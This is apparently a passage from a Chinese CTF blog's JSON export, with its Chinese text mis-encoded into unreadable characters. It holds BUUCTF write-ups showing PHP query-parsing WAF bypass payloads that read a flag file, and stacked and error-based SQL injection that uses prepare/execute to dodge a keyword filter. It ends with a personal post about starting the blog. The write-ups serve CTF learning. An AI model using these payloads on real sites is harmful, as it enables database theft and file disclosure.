æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š1.åˆ é™¤ç©ºç™½ç¬¦ 2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰ã€å½“wafä¸è®©ä½ è¿‡çš„æ—¶å€™ï¼Œphpå´å¯ä»¥è®©ä½ è¿‡ã€‘ã€‚å‡å¦‚wafä¸å…è®¸numå˜é‡ä¼ é€’å­—æ¯ï¼Œå¯ä»¥åœ¨numå‰åŠ ä¸ªç©ºæ ¼ï¼Œè¿™æ ·wafå°±æ‰¾ä¸åˆ°numè¿™ä¸ªå˜é‡äº†ï¼Œå› ä¸ºç°åœ¨çš„å˜é‡å«â€œ numâ€ï¼Œè€Œä¸æ˜¯â€œnumâ€ã€‚ä½†phpåœ¨è§£æçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠç©ºæ ¼ç»™å»æ‰ï¼Œè¿™æ ·æˆ‘ä»¬çš„ä»£ç è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿˜ä¸Šä¼ äº†éæ³•å­—ç¬¦ã€‚\n\n scandir() å‡½æ•°ï¼šè¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚\n\næ„é€ ï¼š`? num=var_dump(scandir(chr(47)))`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082348852.png)\n\nå‘ç°flagæ–‡ä»¶ï¼Œç°åœ¨æ„é€ payloadå°†é‡Œé¢å†…å®¹è¯»å‡ºæ¥å°±è¡Œäº†\n\n```\n? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))\n```\n\nè¿™é‡Œæœ€å¥½ä¸ç”¨echo å› ä¸ºç©ºæ ¼è¢«é»‘åå•äº† ç”¨print_ræˆ–è€…var_dumpéƒ½è¡Œ\n","tags":["æ–‡ä»¶åŒ…å«","phpå­—ç¬¦ä¸²è§£æç‰¹æ€§"],"categories":["buuctf"]},{"title":"buuctf 6-[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨","url":"/post/73bb3fc4.html","content":"\nbuuctf [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨\n\n<!--more-->\n\næ­£å¸¸æ“ä½œåï¼Œå‘ç°åªæœ‰ä¸¤åˆ—ï¼Œç„¶åæœ‰æ­£åˆ™åŒ¹é…è¿‡æ»¤äº†\n\nreturn preg_match(\"/select|update|delete|drop|insert|where|\\./i\",$inject);\n\nè¿™é¢˜è€ƒäº†å †å æ³¨å…¥ï¼ŒåŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯é€šè¿‡ `;` å·æ³¨å…¥å¤šæ¡SQLè¯­å¥ã€‚\n\n```\n-1';show databases;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349074.png)\n\nçœ‹ä¸€ä¸‹å½“å‰çš„æ•°æ®åº“ï¼Œè¿™é‡Œè€ƒåˆ°äº†æŠ¥é”™æ³¨å…¥\n\nåŸç†ï¼š\n\nMySQLæä¾›äº†ä¸€ä¸ª updatexml() å‡½æ•°ï¼Œå½“ç¬¬äºŒä¸ªå‚æ•°åŒ…å«ç‰¹æ®Šç¬¦å·æ—¶ä¼šæŠ¥é”™ï¼Œå¹¶å°†ç¬¬äºŒä¸ªå‚æ•°çš„å†…å®¹æ˜¾ç¤ºåœ¨æŠ¥é”™ä¿¡æ¯ä¸­ã€‚\n\nä½†æ˜¯è¿™é¢˜updateè¢«è¿‡æ»¤äº†\n\nextractvalue() ä¼ å‚æ—¶å€™ç¨æœ‰ä¸åŒï¼Œå…¶ä½™éƒ½æ˜¯ä¸€æ ·çš„ï¼Œç”¨è¿™ä¸¤ä¸ªå‡½æ•°æ—¶ï¼Œå¸¸å¸¸ç”¨åˆ°æ‹¼æ¥å‡½æ•°ï¼Œå°†è¦è¦æŸ¥è¯¢çš„è¯­å¥å’Œç¬¬äºŒä¸ªç‰¹æ®Šç¬¦å·æ‹¼æ¥èµ·æ¥ä¸€èµ·å›æ˜¾ã€‚\n\nsqlé‡Œæ‹¼æ¥å‡½æ•°ï¼šconcatï¼Œconcat_ws ,group_concat\n\n`1' and extractvalue(1,concat(0x7e,database(),0x7e));` 0x7e æ˜¯åå…­è¿›åˆ¶~\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349098.png)\n\nå½“å‰æ•°æ®åº“åœ¨supersqli æ³¨æ„ç»“æœæ˜¯æŒ‰ç…§æŠ¥é”™çš„æ–¹å¼å›æ˜¾çš„ã€‚\n\n`-1';show tables;`çˆ†è¡¨\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349087.png)\n\nflagåœ¨é‚£ä¸²æ•°å­—é‡Œ\n\nè¡¨åä¸ºæ•°å­—æ—¶ï¼Œè¦ç”¨åå¼•å·åŒ…èµ·æ¥æŸ¥è¯¢ã€‚\n\n```\n-1';show columns from `1919810931114514`;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349045.png)\n\nç„¶åè¦ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹é¢„ç¼–è¯‘çŸ¥è¯†ï¼Œæ„é€ èƒ½æ‰§è¡Œçš„è¯­å¥\n\næ–¹æ³•ä¸€ï¼š\n\nset @name1 = sql è¯­å¥ï¼›\n\nprepare name2 from @name1\n\nEXECUTE name2\n\næ³¨æ„ï¼šä¸€ä¸ª@æ˜¯ç”¨æˆ·å˜é‡ï¼Œä¸¤ä¸ª@æ˜¯ç³»ç»Ÿå˜é‡\n\næ–¹æ³•äºŒï¼š\n\nprepare name1 from ä¸€ä¸ªsqlè¯­å¥;\n\nEXECUTE name1ï¼›\n\n\n\nname1,name2çš„æ„æ€æ˜¯ä¸€ä¸ªåå­—\n\nå…¶å®ä¸¤è€…åŸç†éƒ½ä¸€æ ·\n\næ„é€ ï¼š\n\n```\n1';set @a = concat('se','lect * from `1919810931114514`;');prepare b from @a;EXECUTE b;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349034.png)\n\nstrstr()å‡½æ•°å¯¹å¤§å°å†™å¾ˆæ•æ„Ÿï¼Œé€šè¿‡å¤§å†™ç»•è¿‡å³å¯ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349106.png)\n\n```\n1';Set @a = concat('se','lect * from `1919810931114514`;'); Prepare b from @a; EXECUTE b;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349435.png)\n","tags":["sqlæ³¨å…¥","å †å æ³¨å…¥","æŠ¥é”™æ³¨å…¥"],"categories":["buuctf"]},{"title":"å°ç ´ç«™ç ´å£³äº†","url":"/post/1c316701.html","content":"\næƒ³æ¥æƒ³å»ï¼Œçœ‹äº†å…¶ä»–è®¸å¤šå¤§ä½¬çš„æ–‡ç« ï¼Œèµ·åˆèŒç”Ÿäº†æƒ³å»ºé€ ä¸€ä¸ªå±äºè‡ªå·±çš„ç½‘ç«™ï¼Œä½†æ˜¯å»ºç«™ä¸æ˜¯ä¸€ä¸ªç®€å•çš„äº‹æƒ…ï¼Œåªé æˆ‘ç°åœ¨çš„çŸ¥è¯†æ°´å¹³æ˜¯å®Œå…¨ä¸å¤Ÿçš„ï¼Œäºæ˜¯å°±æƒ³ç®€å•ç®€ç­”çš„å»ºé€ ä¸€ä¸ªåšå®¢ï¼Œç”¨æ¥åˆ†äº«æˆ‘çš„ä¸€äº›åšé¢˜è¿‡ç¨‹ä¸ç”Ÿæ´»çäº‹ã€‚\n\n<!--more-->\n\n2023.2.5ï¼Œä»Šå¤©å±äºæˆ‘çš„åšå®¢å°ç ´ç«™å»ºæˆäº†ï¼ˆå¼€å¿ƒ~ï¼‰ï¼Œè™½ç„¶åªæ˜¯ç®€å•è¿ç”¨äº†hexoå’Œå¤§å®¶éƒ½çŸ¥é“çš„nextä¸»é¢˜ï¼Œå‚»ç“œå¼å»ºé€ æœ€åä¸Šä¼ è‡³githubï¼Œä½†æ˜¯æ•´ä¸ªè¿‡ç¨‹è¿˜æ˜¯è›®æ›²æŠ˜çš„ï¼Œå»ºé€ è¿‡ç¨‹æŠ¥äº†å¥½å¤šé”™è¯¯ï¼Œä½†æ˜¯è¿˜æ˜¯é ç€æŸ¥è¯¢ä¸€ç‚¹ä¸€ç‚¹ä¿®æ”¹ï¼Œæœ€ç»ˆä¸€ä¸ªç®€ç®€å•å•çš„å°åšå®¢ç«™å»ºå¥½äº†ã€‚\n\nåœ¨è¿™ä¸ªåšå®¢ä¸­æˆ‘ä¼šç”¨æ¥åˆ†äº«ä¸€äº›åšé¢˜åˆ·é¢˜çš„è¿‡ç¨‹ï¼Œå…¶å®å°±æ˜¯ç›‘ç£è‡ªå·±ï¼Œä¸è¦ä¸‰å¤©æ‰“é±¼ä¸¤å¤©æ™’ç½‘ã€‚å¦‚æœä½ çœ‹åˆ°æˆ‘çš„wpä¸­æœ‰é”™è¯¯ï¼Œæˆ‘éå¸¸æ¬¢è¿æ‚¨èƒ½ç»™æˆ‘æŒ‡å‡ºã€‚å…¶æ¬¡åˆ†äº«ä¸€ä¸‹è‡ªå·±åœ¨ç”Ÿæ´»ä¸­çš„æ‰€è§æ‰€é—»æ‰€æ„Ÿï¼Œè®©ä¹‹åçš„è‡ªå·±å›å‘³ä¼šè§‰å¾—ä¹‹å‰çš„æ—¥å­è¿‡å¾—æœ‰æ„ä¹‰ä¸€ç‚¹ã€‚\n\nå¸Œæœ›æˆ‘èƒ½å®ˆä½è‡ªå·±çš„åˆå¿ƒ\n\n2023.2.5 \n\nZ1d10t\n\n"}]